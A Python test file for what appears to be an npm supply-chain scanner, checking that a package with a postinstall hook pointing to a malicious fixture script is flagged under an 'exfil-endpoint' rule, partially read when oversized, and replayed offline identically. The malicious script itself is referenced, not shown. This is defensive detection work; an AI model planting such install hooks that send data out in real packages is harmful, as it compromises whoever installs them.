BIG_BINARY = (b"\x7fELF\x02\x01\x01\x00" + bytes(range(256)) * 16) * 8200  # ~33.6 MB


def test_record_static_reads_a_large_hooked_version_partially_and_replays_it(
    tmp_path: Path, router: Router
) -> None:
    data = DataDir(tmp_path / "data")
    tarball = make_tar_gz(
        [
            TarEntry("package/package.json", HOOKED),
            TarEntry("package/setup.js", BAD["lib/x.js"]),
            TarEntry("package/prebuilds/linux-x64/kx.node", BIG_BINARY),
        ]
    )
    url = "https://r.test/kx-2.0.0.tgz"
    router.add_bytes(url, tarball)
    size = len(HOOKED) + len(BAD["lib/x.js"]) + len(BIG_BINARY)
    assert size > MAX_HOOK_ARTIFACT_BYTES
    new = VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version="2.0.0"),
        publish=PublishInfo(published_at=T0),
        manifest={"scripts": {"postinstall": "node setup.js"}},
        artifact=ArtifactRef(url=url, integrity=sri_sha512(tarball), unpacked_size=size),
    )
    run_dir = data.run_dir("r1")
    write_jsonl(
        run_dir / "batches.jsonl",
        [
            PackageBatch(
                ecosystem="npm", name="kx", base=None, versions=(Candidate(change=Change(new=new)),)
            )
        ],
    )
    (result,) = record_static(data, "r1", NpmEcosystem, client=router.client())
    (version,) = result.versions
    decision = version.history[-1]
    assert decision.forwarded and "static.exfil-endpoint" in decision.reason
    assert decision.reason.endswith("; partial read: 1 file (33.7 MB) not read")
    assert any(f.rule_id == "static.partial-read" for f in version.findings)
    assert not any(f.rule_id == "npm.artifact.size-mismatch" for f in version.findings)

    snapshot_file = Snapshot.load(run_dir / STATIC_SNAPSHOT)
    (key,) = snapshot_file.entries
    entry = snapshot_file.entries[key]
    assert key == f"GET {url} partial={PARTIAL_POLICY.version}"
    assert (entry.url, entry.content_type) == (url, PARTIAL_CONTENT_TYPE)
    assert entry.size < len(tarball) // 10  # the re-pack, not the tarball
    assert not data.blobs.exists(hashlib.sha256(tarball).hexdigest())
    recorded = (run_dir / "static.jsonl").read_bytes()

    # A re-score from the run's snapshot alone, offline, with no cross-run cache: identical.
    shutil.rmtree(data.immutable_index)
    offline = httpx.Client(transport=httpx.MockTransport(lambda r: pytest.fail("network used")))
    record_static(data, "r1", NpmEcosystem, client=offline, seed=snapshot_file)
    assert (run_dir / "static.jsonl").read_bytes() == recorded
    assert router.requests == [url]


def test_the_files_a_hook_names_are_kept_first() -> None:
    """A hook's script late in a large package's tar is kept even when the budget is full of
    the package's own code: `partial_policy` ranks the files the hooks name 0."""
    hooked = snapshot("1.0.1", hook="postinstall")  # `node setup.js`
    assert partial_policy(hooked).rank("setup.js", b"") == 0
    assert partial_policy(hooked).rank("lib/a.js", b"") == 1
    assert partial_policy(snapshot("1.0.1")) is PARTIAL_POLICY
    tight = replace(partial_policy(hooked), max_kept_bytes=2000)
    tarball = make_tar_gz(
        [TarEntry(f"package/lib/{i}.js", b"x" * 900) for i in range(2)]
        + [TarEntry("package/setup.js", b"require('https')" * 40)]
    )
    archive = stream_tar_gz([tarball], tight, strip_components=1)
    assert "setup.js" in archive.files
    assert [o.path for o in archive.omitted] == ["lib/0.js"]
